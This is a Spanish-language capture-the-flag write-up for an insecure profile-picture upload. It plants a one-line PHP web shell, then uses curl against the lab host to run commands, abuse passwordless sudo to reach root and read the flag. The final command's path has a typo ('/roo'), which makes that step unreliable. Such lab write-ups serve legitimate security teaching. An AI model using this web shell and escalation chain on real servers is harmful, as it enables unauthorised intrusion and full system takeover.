## Descripcion
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. You can access the web application [here](http://xebec.cylabacademy.net:14465/)!
## Solucion
### 1. Crear el archivo PHP

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Descripción:** Crea `shell.php`, un archivo PHP que permite ejecutar comandos del sistema mediante el parámetro `cmd`.

### 2. Comprobar ejecución de comandos

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=id"
```

**Descripción:** Comprueba que el archivo PHP se ejecuta correctamente y muestra el usuario con el que se ejecutan los comandos.

**Resultado:** `www-data`.

### 3. Revisar permisos de sudo

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=sudo%20-l"
```

**Descripción:** Muestra los permisos de `sudo` disponibles para `www-data`.

**Resultado importante:** `www-data` puede ejecutar cualquier comando como cualquier usuario sin contraseña.

### 4. Comprobar la escalada a root

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=sudo%20id"
```

**Descripción:** Ejecuta `id` utilizando `sudo` para comprobar que es posible ejecutar comandos con privilegios de `root`.

**Resultado:** `uid=0(root)`.

### 5. Listar el contenido de /root

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=sudo%20ls%20-la%20/root"
```

**Descripción:** Muestra los archivos existentes en `/root` utilizando los privilegios de `root`.

### 6. Buscar archivos dentro de /root

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=sudo%20find%20/root%20-type%20f"
```

**Descripción:** Busca todos los archivos dentro del directorio `/root` para localizar el archivo que contiene la bandera.

### 7. Leer la bandera

```
curl "http://xebec.cylabacademy.net:14465/uploads/shell.php?cmd=sudo%20cat%20/roo/flag.txt"
```

**Descripción:** Utiliza `sudo` para leer como `root` el archivo encontrado en `/root` y obtener la bandera.
